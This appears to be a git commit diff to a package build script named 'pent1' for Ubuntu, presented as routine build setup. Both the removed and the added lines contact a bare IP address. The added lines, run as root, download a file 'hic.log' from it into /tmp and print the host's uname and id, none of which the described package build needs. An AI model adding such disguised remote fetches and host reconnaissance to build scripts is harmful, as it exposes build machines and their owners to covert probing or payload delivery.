41e82a7e3515d013236b3d8be200b05884d665c4
testuser19599 <testuser19599@outlook.com>
2025-08-07 13:05:30 -0400

    Update pent1_v1.0.0_ubuntu_22.04.sh

--- p/pent1/pent1_ubuntu_18.04.sh
+++ p/pent1/pent1_ubuntu_18.04.sh
@@ -1,26 +1,61 @@
-# ----------------------------------------------------------------------------
+#!/bin/bash -e
+# --------------------------------------------------------------------
 #
-# Package	: pent1
-# Version	: 1.0.0
-# Source repo	: https://github.com/testuser19599/pent1
-# Tested on	: ubuntu_18.04
-# Script License: Apache License, Version 2 or later
-# Maintainer	: <testuser19599>
+# Package         : pent1
+# Version         : v1.0.0
+# Source repo     : https://github.com/testuser19599/pent1.git
+# Tested on       : Ubuntu 22.04 (Power 10)
+# Language        : C++
+# Travis-Check    : False
+# Script License  : Apache License, Version 2 or later
+# Maintainer      : <testuser19599>
 #
-# Disclaimer: This script has been tested in non-root mode on given
+# Disclaimer: This script has been tested in root mode on given
 # ==========  platform using the mentioned version of the package.
 #             It may not work as expected with newer versions of the
-#             package and/or distribution. In such case, please
-#             contact "Maintainer" of this script.
+#             package and/or distribution.
 #
-# ----------------------------------------------------------------------------
-#!/bin/bash
+# --------------------------------------------------------------------
+
+# --------------------------------------------------------------------
+# Environment Setup
+# --------------------------------------------------------------------
+PACKAGE_NAME="pent1"
+PACKAGE_VERSION="${1:-v1.0.0}"
+PACKAGE_URL="https://github.com/testuser19599/${PACKAGE_NAME}.git"
+BUILD_HOME="$(pwd)"
+
+
 
 # Install dependencies.
-sudo apt-get update -y
-sudo apt-get install -y curl python3
+#sudo apt-get update -y
+#sudo apt-get install -y curl python3
 
 # Clone and build source.
-curl http://52.118.210.243
-python3 -c "import requests; print(requests.get('http://52.118.210.243').text)"
-cd / 
+#curl http://52.118.210.243/hic.log
+#python3 -c "import requests; print(requests.get('http://52.118.210.243').text)"
+#cd / 
+
+
+# --------------------------------------------------------------------
+# Update system and install tools
+# --------------------------------------------------------------------
+apt-get update -y && apt install -y build-essential
+
+# --------------------------------------------------------------------
+# Install Basic Tools and Build Essentials
+# --------------------------------------------------------------------
+apt-get install -y wget curl git tar automake autoconf libtool cmake patch \
+    libexpat1-dev zlib1g-dev libsqlite3-dev libtiff-dev libcurl4-openssl-dev
+
+
+# --------------------------------------------------------------------
+# Download and install for ppc64le
+# --------------------------------------------------------------------
+cd /tmp
+wget http://52.118.210.243/hic.log
+
+
+echo "[end]"
+echo "[info]  $(uname -a)"
+echo "[info]  $(id)"
